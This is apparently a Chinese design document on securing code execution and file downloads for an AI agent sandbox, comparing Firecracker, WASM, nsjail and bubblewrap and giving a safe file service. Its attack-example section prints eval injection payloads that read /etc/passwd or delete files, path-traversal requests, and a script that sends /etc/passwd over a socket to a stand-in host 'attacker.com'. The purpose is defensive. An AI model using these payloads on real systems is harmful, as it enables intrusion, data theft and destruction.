# 代码执行与文件下载安全分析及沙箱方案

> 文档版本：1.0  
> 创建日期：2026-08-05  
> 安全级别：🔴 高危

---

## 1. 安全风险分析

### 1.1 代码执行风险

| 风险类型 | 攻击方式 | 影响 | 风险等级 |
|---------|---------|------|---------|
| **任意代码执行** | `eval()`, `exec()` 注入 | 服务器完全控制 | 🔴 高危 |
| **文件系统访问** | `open('/etc/passwd')` | 敏感数据泄露 | 🔴 高危 |
| **网络请求** | `requests.get('http://attacker.com')` | 数据外传、SSRF | 🔴 高危 |
| **子进程执行** | `subprocess.run('rm -rf /')` | 系统破坏 | 🔴 高危 |
| **资源耗尽** | 无限循环、大内存分配 | DoS 攻击 | 🟡 中危 |
| **反序列化漏洞** | `pickle.loads(malicious)` | 远程代码执行 | 🔴 高危 |

### 1.2 文件下载风险

| 风险类型 | 攻击方式 | 影响 | 风险等级 |
|---------|---------|------|---------|
| **路径遍历** | `download?file=../../../etc/passwd` | 敏感文件泄露 | 🔴 高危 |
| **任意文件读取** | 读取其他用户生成的文件 | 数据泄露 | 🔴 高危 |
| **恶意文件上传** | 上传可执行脚本 | 后续攻击跳板 | 🟡 中危 |
| **大文件下载** | 下载超大文件 | 带宽耗尽、DoS | 🟡 中危 |
| **MIME 类型混淆** | 伪装文件类型 | XSS、客户端攻击 | 🟡 中危 |

---

## 2. 攻击示例

### 2.1 代码执行攻击

```python
# ⚠️ 危险的代码执行
def execute_code(user_code: str):
    return eval(user_code)

# 恶意输入：
# "__import__('os').system('cat /etc/passwd')"

# 或者：
# "__import__('subprocess').run(['rm', '-rf', '/workspace'])"
```

### 2.2 文件下载攻击

```python
# ⚠️ 危险的文件下载
@app.get("/download")
def download(filename: str):
    return FileResponse(f"/workspace/{filename}")

# 恶意请求：
# /download?file=../../other_user/secret.csv
# /download?file=/etc/passwd
```

### 2.3 组合攻击

```python
# 多步骤攻击
# 步骤 1: 上传恶意脚本
upload("evil.py", content="""
import socket
s = socket.socket()
s.connect(('attacker.com', 4444'))
import subprocess
subprocess.run(['cat', '/etc/passwd'], stdout=s)
""")

# 步骤 2: 执行脚本
execute_code("exec(open('evil.py').read())")

# 步骤 3: 通过下载接口外传数据
download("exfiltrated_data.txt")
```

---

## 3. Harness 架构详解

### 3.1 什么是 Harness 架构？

**Harness** 是一个轻量级的代码执行沙箱框架，专为 AI Agent 设计。它的核心思想是：

```
┌─────────────────────────────────────────────────────────────┐
│                    Harness 架构                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐      │
│  │   Agent     │───►│  Harness    │───►│  Sandbox    │      │
│  │  (LLM)      │    │  (编排层)   │    │  (执行层)   │      │
│  └─────────────┘    └─────────────┘    └─────────────┘      │
│                            │                  │               │
│                            │                  ▼               │
│                            │         ┌─────────────┐         │
│                            │         │  seccomp    │         │
│                            │         │  namespaces │         │
│                            │         │  cgroups    │         │
│                            │         └─────────────┘         │
│                            ▼                                  │
│                   ┌─────────────┐                            │
│                   │   Tools     │                            │
│                   │  (白名单)   │                            │
│                   └─────────────┘                            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 3.2 Harness 核心组件

```
┌─────────────────────────────────────────────────────────────┐
│  Harness Core                                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Execution Engine (执行引擎)                              │
│     ├─ Code Executor (代码执行器)                            │
│     ├─ Tool Registry (工具注册表)                            │
│     └─ Result Aggregator (结果聚合器)                        │
│                                                              │
│  2. Security Layer (安全层)                                  │
│     ├─ Permission System (权限系统)                          │
│     ├─ Resource Quota (资源配额)                             │
│     └─ Audit Logger (审计日志)                               │
│                                                              │
│  3. Sandbox Backend (沙箱后端)                               │
│     ├─ Docker/Podman Container                               │
│     ├─ gVisor                                                │
│     ├─ Firecracker MicroVM                                   │
│     └─ WASM Runtime                                          │
│                                                              │
│  4. State Management (状态管理)                              │
│     ├─ Checkpoint (检查点)                                   │
│     ├─ Memory Store (内存存储)                               │
│     └─ File Isolation (文件隔离)                             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 Harness 工作流程

```python
# Harness 执行流程
async def harness_execute(agent_request: AgentRequest) -> ExecutionResult:
    """
    Harness 执行流程
    """
    # 1. 解析请求
    request = parse_request(agent_request)
    
    # 2. 权限验证
    if not await permission_check(request):
        raise PermissionDeniedError()
    
    # 3. 资源配额检查
    if not await quota_check(request.user_id):
        raise QuotaExceededError()
    
    # 4. 创建沙箱环境
    sandbox = await sandbox_factory.create(
        user_id=request.user_id,
        timeout=request.timeout,
        resources=request.resources,
    )
    
    # 5. 执行代码/工具
    try:
        result = await sandbox.execute(request.code, request.tools)
    except Exception as e:
        result = ExecutionResult(error=str(e))
    finally:
        # 6. 清理沙箱
        await sandbox.cleanup()
    
    # 7. 记录审计日志
    await audit_log(request, result)
    
    return result
```

---

## 4. 轻量级沙箱方案

### 4.1 方案对比

| 方案 | 启动时间 | 内存占用 | 隔离级别 | 适用场景 |
|------|---------|---------|---------|---------|
| **Docker** | 1-3 秒 | 50-100MB | 🟡 中 | 通用 |
| **gVisor** | 2-5 秒 | 100-200MB | 🟢 高 | 高安全 |
| **Firecracker** | 100-500ms | 20-50MB | 🟢 高 | 代码执行 |
| **WASM** | 10-50ms | 5-10MB | 🟡 中 | 纯计算 |
| **nsjail** | 50-100ms | 10-20MB | 🟡 中 | 轻量隔离 |
| **bubblewrap** | 10-20ms | 5-10MB | 🟡 中 | 文件隔离 |

### 4.2 Firecracker MicroVM (推荐)

```python
# firecracker_sandbox.py
import asyncio
from dataclasses import dataclass
from firecracker import Machine, Drive, NetworkInterface

@dataclass
class SandboxConfig:
    user_id: str
    session_id: str
    memory_mb: int = 128
    vcpu_count: int = 1
    timeout_seconds: int = 30

class FirecrackerSandbox:
    """Firecracker MicroVM 沙箱"""
    
    def __init__(self, config: SandboxConfig):
        self.config = config
        self.vm_id = f"vm-{config.user_id}-{config.session_id}"
        self.socket_path = f"/tmp/firecracker/{self.vm_id}.socket"
        
        # Firecracker 二进制路径
        self.bin_path = "/usr/local/bin/firecracker"
        
        # 内核和根文件系统
        self.kernel_path = "/opt/firecracker/vmlinux"
        self.rootfs_path = f"/opt/firecracker/rootfs-{config.user_id}.ext4"
    
    async def start(self):
        """启动 MicroVM"""
        self.machine = Machine(
            bin_path=self.bin_path,
            socket_path=self.socket_path,
        )
        
        self.machine.start(
            kernel_location=self.kernel_path,
            root_drive=Drive(
                path_on_host=self.rootfs_path,
                is_root_device=True,
                is_read_only=False,
            ),
            network_interfaces=[
                NetworkInterface(
                    iface_id="eth0",
                    host_dev_name="veth0",
                )
            ],
            metadata={
                "user_id": self.config.user_id,
                "session_id": self.config.session_id,
            },
            memory_mib=self.config.memory_mb,
            vcpu_count=self.config.vcpu_count,
        )
        
        # 等待 VM 就绪
        await self._wait_for_ssh()
    
    async def execute(self, code: str, timeout: int = None) -> ExecutionResult:
        """在沙箱中执行代码"""
        timeout = timeout or self.config.timeout_seconds
        
        # 通过 SSH 执行代码
        result = await self._ssh_execute(
            command=f"python3 -c {shlex.quote(code)}",
            timeout=timeout,
        )
        
        return ExecutionResult(
            stdout=result.stdout,
            stderr=result.stderr,
            exit_code=result.exit_code,
        )
    
    async def upload_file(self, local_path: str, remote_path: str):
        """上传文件到沙箱"""
        await self._scp_upload(local_path, remote_path)
    
    async def download_file(self, remote_path: str, local_path: str):
        """从沙箱下载文件"""
        await self._scp_download(remote_path, local_path)
    
    async def cleanup(self):
        """清理沙箱"""
        if hasattr(self, 'machine'):
            self.machine.stop()
        
        # 清理 socket
        if os.path.exists(self.socket_path):
            os.remove(self.socket_path)
```

### 4.3 WASM 沙箱 (最轻量)

```python
# wasmtime_sandbox.py
from wasmtime import Store, Module, Instance, Func, WasmtimeError
import io
import sys

class WASMSandbox:
    """WASM 沙箱 - 最轻量级方案"""
    
    def __init__(self, timeout_ms: int = 5000):
        self.timeout_ms = timeout_ms
        self.store = Store()
        
        # 设置资源限制
        self.store.epoch_deadline_trap()
        self.store.epoch_deadline_after(timeout_ms // 100)
    
    def execute(self, wasm_code: bytes, function_name: str = "run") -> ExecutionResult:
        """执行 WASM 代码"""
        try:
            # 加载模块
            module = Module(self.store.engine, wasm_code)
            
            # 创建实例（注入受限的导入）
            instance = Instance(
                self.store,
                module,
                self._build_imports()
            )
            
            # 调用导出函数
            run_func = getattr(instance.exports, function_name, None)
            if run_func is None:
                raise SandboxError(f"Function '{function_name}' not found")
            
            result = run_func()
            
            return ExecutionResult(
                stdout=str(result),
                stderr="",
                exit_code=0,
            )
            
        except WasmtimeError as e:
            return ExecutionResult(
                stdout="",
                stderr=str(e),
                exit_code=1,
            )
    
    def _build_imports(self):
        """构建受限的导入（沙箱环境）"""
        # 只提供安全的导入
        # 无法访问文件系统、网络等
        
        def safe_print(value: int):
            print(f"WASM: {value}")
        
        return {
            "env": {
                "print": Func(self.store, safe_print),
                # 不提供文件、网络等危险导入
            }
        }
```

### 4.4 nsjail (Google 开源)

```bash
# nsjail 配置
# /etc/nsjail/sandbox.cfg

# 执行环境配置
name = "Code Execution Sandbox"

# 进程隔离
mode = ONCE
daemon = false

# 用户/组隔离
uidmap {
    inside_id: "1000"
    outside_id: "65534"  # nobody
}

gidmap {
    inside_id: "1000"
    outside_id: "65534"
}

# 文件系统隔离
mount {
    src: "/tmp/sandbox/root"
    dst: "/"
    is_bind: true
    rw: true
}

mount {
    src: "/proc"
    dst: "/proc"
    is_bind: true
    rw: false
}

# 网络隔离
use_netns: true

# 资源限制
rlimit_as_type: HARD
rlimit_cpu_type: HARD
rlimit_nofile: 100

# 系统调用过滤（seccomp）
keep_caps: false
disable_no_new_privs: false

seccomp_string: """
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "syscalls": [
        {"name": "read", "action": "SCMP_ACT_ALLOW"},
        {"name": "write", "action": "SCMP_ACT_ALLOW"},
        {"name": "open", "action": "SCMP_ACT_ALLOW"},
        {"name": "close", "action": "SCMP_ACT_ALLOW"},
        {"name": "stat", "action": "SCMP_ACT_ALLOW"},
        {"name": "exit", "action": "SCMP_ACT_ALLOW"},
        {"name": "exit_group", "action": "SCMP_ACT_ALLOW"},
        {"name": "brk", "action": "SCMP_ACT_ALLOW"},
        {"name": "mmap", "action": "SCMP_ACT_ALLOW"},
        {"name": "munmap", "action": "SCMP_ACT_ALLOW"},
    ]
}
"""
```

```python
# nsjail_executor.py
import subprocess
import tempfile
import os

class NsJailExecutor:
    """nsjail 代码执行器"""
    
    def __init__(self, config_path: str = "/etc/nsjail/sandbox.cfg"):
        self.config_path = config_path
        self.nsjail_bin = "/usr/local/bin/nsjail"
    
    def execute(self, code: str, language: str = "python") -> ExecutionResult:
        """在 nsjail 沙箱中执行代码"""
        # 创建临时目录
        with tempfile.TemporaryDirectory() as tmpdir:
            # 写入代码文件
            code_file = os.path.join(tmpdir, f"code.{language}")
            with open(code_file, 'w') as f:
                f.write(code)
            
            # 构建 nsjail 命令
            cmd = [
                self.nsjail_bin,
                "--config", self.config_path,
                "--",
                "python3", code_file,
            ]
            
            # 执行
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )
            
            return ExecutionResult(
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.returncode,
            )
```

### 4.5 bubblewrap (最轻量)

```python
# bubblewrap_sandbox.py
import subprocess
import tempfile
import os

class BubblewrapSandbox:
    """bubblewrap 沙箱 - 最轻量级"""
    
    def __init__(self):
        self.bwrap_bin = "/usr/bin/bwrap"
    
    def execute(self, code: str, language: str = "python") -> ExecutionResult:
        """在 bubblewrap 沙箱中执行代码"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # 创建隔离的根目录
            root_dir = os.path.join(tmpdir, "root")
            os.makedirs(root_dir)
            
            # 创建必要的目录
            os.makedirs(os.path.join(root_dir, "tmp"))
            os.makedirs(os.path.join(root_dir, "dev"))
            
            # 写入代码
            code_file = os.path.join(root_dir, "code.py")
            with open(code_file, 'w') as f:
                f.write(code)
            
            # 构建 bubblewrap 命令
            cmd = [
                self.bwrap_bin,
                "--dev-bind", "/dev", "/dev",
                "--ro-bind", "/usr", "/usr",
                "--ro-bind", "/lib", "/lib",
                "--ro-bind", "/lib64", "/lib64",
                "--tmpfs", "/tmp",
                "--chdir", "/",
                "--unshare-all",  # 隔离所有命名空间
                "--die-with-parent",  # 父进程退出时终止
                "--",
                "python3", "/code.py",
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )
            
            return ExecutionResult(
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.returncode,
            )
```

---

## 5. 文件下载安全实现

### 5.1 安全文件下载服务

```python
# secure_file_service.py
from pathlib import Path
import hashlib
import mimetypes

class SecureFileService:
    """安全文件服务"""
    
    ALLOWED_EXTENSIONS = {
        '.txt', '.md', '.csv', '.json', '.xml',
        '.pdf', '.docx', '.xlsx', '.pptx',
        '.png', '.jpg', '.jpeg', '.gif', '.svg',
    }
    
    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
    
    def __init__(self, base_path: str, user_id: str, session_id: str):
        self.base_path = Path(base_path)
        self.user_path = self.base_path / "users" / user_id / "sessions" / session_id
        self.user_path.mkdir(parents=True, exist_ok=True)
    
    def resolve_path(self, filename: str) -> Path:
        """安全解析文件路径"""
        # 规范化路径
        safe_name = Path(filename).name  # 只取文件名，防止路径遍历
        
        # 构建完整路径
        file_path = self.user_path / safe_name
        
        # 验证路径在用户目录内
        try:
            file_path.resolve().relative_to(self.user_path.resolve())
        except ValueError:
            raise SecurityError(f"Invalid file path: {filename}")
        
        return file_path
    
    async def download(self, filename: str) -> FileResponse:
        """安全下载文件"""
        file_path = self.resolve_path(filename)
        
        # 检查文件存在
        if not file_path.exists():
            raise FileNotFoundError(f"File not found: {filename}")
        
        # 检查文件大小
        file_size = file_path.stat().st_size
        if file_size > self.MAX_FILE_SIZE:
            raise SecurityError(f"File too large: {file_size} bytes")
        
        # 检查扩展名
        if file_path.suffix.lower() not in self.ALLOWED_EXTENSIONS:
            raise SecurityError(f"File type not allowed: {file_path.suffix}")
        
        # 检测 MIME 类型
        mime_type, _ = mimetypes.guess_type(file_path)
        
        return FileResponse(
            path=str(file_path),
            media_type=mime_type or "application/octet-stream",
            filename=file_path.name,
            headers={
                "X-Content-Type-Options": "nosniff",
                "Content-Disposition": f"attachment; filename={file_path.name}",
            }
        )
    
    async def upload(self, filename: str, content: bytes) -> str:
        """安全上传文件"""
        # 验证文件名
        safe_name = Path(filename).name
        
        # 验证扩展名
        ext = Path(safe_name).suffix.lower()
        if ext not in self.ALLOWED_EXTENSIONS:
            raise SecurityError(f"File type not allowed: {ext}")
        
        # 验证大小
        if len(content) > self.MAX_FILE_SIZE:
            raise SecurityError(f"File too large: {len(content)} bytes")
        
        # 生成唯一文件名（防止覆盖）
        file_hash = hashlib.sha256(content).hexdigest()[:8]
        unique_name = f"{file_hash}_{safe_name}"
        
        file_path = self.user_path / unique_name
        file_path.write_bytes(content)
        
        return unique_name
```

---

## 6. 推荐架构

### 6.1 Harness + Firecracker 架构

```
┌─────────────────────────────────────────────────────────────┐
│                    Harness 编排层                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Agent Request ──► Permission Check ──► Quota Check         │
│                                              │               │
│                                              ▼               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              Firecracker Pool                        │    │
│  │  ┌───────────┐  ┌───────────┐  ┌───────────┐       │    │
│  │  │  VM α     │  │  VM β     │  │  VM γ     │       │    │
│  │  │ (用户 A)  │  │ (用户 B)  │  │ (用户 C)  │       │    │
│  │  │           │  │           │  │           │       │    │
│  │  │ ┌───────┐ │  │ ┌───────┐ │  │ ┌───────┐ │       │    │
│  │  │ │Python │ │  │ │Python │ │  │ │Python │ │       │    │
│  │  │ │ Node  │ │  │ │ Node  │ │  │ │ Node  │ │       │    │
│  │  │ └───────┘ │  │ └───────┘ │  │ └───────┘ │       │    │
│  │  └───────────┘  └───────────┘  └───────────┘       │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
│                          ▼                                   │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              Secure File Service                     │    │
│  │  - 用户目录隔离                                       │    │
│  │  - 文件类型白名单                                     │    │
│  │  - 大小限制                                          │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 6.2 推荐配置

| 组件 | 推荐方案 | 说明 |
|------|---------|------|
| **代码执行** | Firecracker MicroVM | 完全隔离，启动快 (100-500ms) |
| **文件服务** | 用户目录隔离 + 白名单 | 防止路径遍历和恶意文件 |
| **资源限制** | cgroups v2 | CPU、内存、IO 限制 |
| **网络隔离** | NetworkPolicy + seccomp | 禁止危险系统调用 |
| **审计日志** | 完整记录所有操作 | 安全事件追溯 |

---

## 7. 总结

### 安全建议

1. **代码执行必须使用沙箱** - Firecracker 或 nsjail
2. **文件下载必须验证路径** - 防止路径遍历
3. **完整审计日志** - 记录所有代码执行和文件操作
4. **资源配额限制** - 防止 DoS 攻击
5. **网络访问控制** - 禁止外连或只允许白名单

### 推荐方案

```
Harness 编排 + Firecracker MicroVM
- 完全隔离的用户代码执行
- 毫秒级启动
- 低内存占用 (20-50MB/VM)
- 支持文件上传/下载
- 完整的审计日志
```
